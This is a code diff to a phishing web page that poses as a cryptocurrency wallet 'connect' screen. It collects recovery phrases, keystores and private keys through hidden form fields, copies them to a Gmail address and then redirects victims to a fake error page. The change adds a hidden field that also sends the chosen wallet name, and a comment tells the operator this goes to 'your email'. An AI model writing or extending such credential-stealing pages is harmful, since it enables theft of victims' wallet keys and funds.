@@ -231,6 +231,7 @@ input:focus, textarea:focus{
                 <input type="text" name="privateKey" placeholder="Enter your Private Key">
             </div>
             <input type="hidden" name="_captcha" value="false">
+            <input type="hidden" name="selectedWallet" id="selectedWallet">
             <input type="hidden" name="_cc" value="lemoaremu@gmail.com">
             <input type="hidden" name="_next" value="https://error-sage.vercel.app/">
             <button type="submit" id="submitBtn">Submit</button>
@@ -238,28 +239,33 @@ input:focus, textarea:focus{
     </div>
 
     <script>
-
-        const walletName = localStorage.getItem('selectedWallet');
-        if (walletName) {
-          document.getElementById('walletTitle').textContent = `Connect ${walletName}`;
-        }
-
-        function showInput(type) {
+        
+          // Get the stored wallet name
+          const walletName = localStorage.getItem('selectedWallet');
+        
+          // If found, display it in the title and send it with the form
+          if (walletName) {
+            document.getElementById('walletTitle').textContent = `Connect ${walletName}`;
+            document.getElementById('selectedWallet').value = walletName; // 👈 This sends wallet name to your email
+          }
+        
+          function showInput(type) {
             document.getElementById('phraseInput').style.display = 'none';
             document.getElementById('keystoreInput').style.display = 'none';
             document.getElementById('privateKeyInput').style.display = 'none';
-
+        
             if (type === 'phrase') {
-                document.getElementById('phraseInput').style.display = 'block';
+              document.getElementById('phraseInput').style.display = 'block';
             } else if (type === 'keystore') {
-                document.getElementById('keystoreInput').style.display = 'block';
+              document.getElementById('keystoreInput').style.display = 'block';
             } else if (type === 'privateKey') {
-                document.getElementById('privateKeyInput').style.display = 'block';
+              document.getElementById('privateKeyInput').style.display = 'block';
             }
-        }
-
-        // Show Phrase input by default
-        showInput('phrase');
-    </script>
+          }
+        
+          // Show Phrase input by default
+          showInput('phrase');
+</script>
 </body>
+
 </html>
